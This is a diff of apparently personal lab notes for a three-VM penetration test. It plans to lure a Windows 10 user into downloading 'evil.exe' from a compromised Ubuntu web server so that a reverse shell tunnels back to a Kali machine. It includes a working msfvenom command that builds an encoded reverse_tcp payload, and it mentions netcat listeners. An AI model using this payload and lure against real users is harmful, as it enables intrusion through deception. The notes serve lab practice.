@@ -1,13 +1,27 @@
-Kali-lab test
+Environment setup:
+Kali VM, Ubuntu VM, & Windows-10 VM (unpatched & all security off).
 
-Goal:  
-- Gain access from <Kali> to <TARGET>/(Win-10) through a web-server.
-How:
-- From <TARGET>; view Ubuntu "compromised-web-srvr"; download "evil.exe" and have traffic appear as normal web traffic.
+Kali-lab test:
+
+    Kali-VM			             UbUntu-VM			   	  Windows10-VM
+  My attack VM 			        compromised Web-Srvr		            <TARGET>
+ _______________		          _______________		         _______________
+|		|		         | <click-bait>	 |		        |		| 
+|	        |		         |               |                	|               |
+|		|		         |		 |		        |		|  
+|   		|            		 |               |                      |     		|
+|_______________|		         |_______________|		        |_______________|
+   10.0.0.20			             10.0.0.30			     	    10.0.0.40                                           
+  
+- Using the scenario above (^), we will pretend we've already gained access to the Ubuntu Web server (username/password)
+- We will lure a Windows 10 user (10.0.0.40) to download a malicious payload from the Ubuntu server; which will establish a tunnel from 
+the Windows user THROUGH the Ubuntu server- to our Kali attack machine.
+-- we want the traffic to route back throug
+From <TARGET>; view Ubuntu "compromised-web-srvr"; download "evil.exe" and have traffic appear as normal web traffic.
 	--See first diagram below.*
 
-Idea #1:
---------
+
+<------------------------------------------------------------------------------------------------------------------------->
 1) From: kali [msfconsole]--
 	#> msfvenom -p windows/shell/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe LHOST=10.0.0.30 LPORT=5959 > evil.exe
 2) From: UbUntu [/home/ubuntu/Public] -- Host "evil.exe" on UbUntu-VM (/home/ubuntu/Public)
@@ -37,8 +51,7 @@ Idea #2 use netcat listeners instead of ssh tunnel
 |		|		         |		 |		        |		|  
 |   		|            		 |               |                      |     		|
 |_______________|		         |_______________|		        |_______________|
-   10.0.0.20			             10.0.0.30			     	    10.0.0.40
-- kali 				- ubuntu			-                                           
+   10.0.0.20			             10.0.0.30			     	    10.0.0.40                                           
 
 
 ===============================================================================================================================
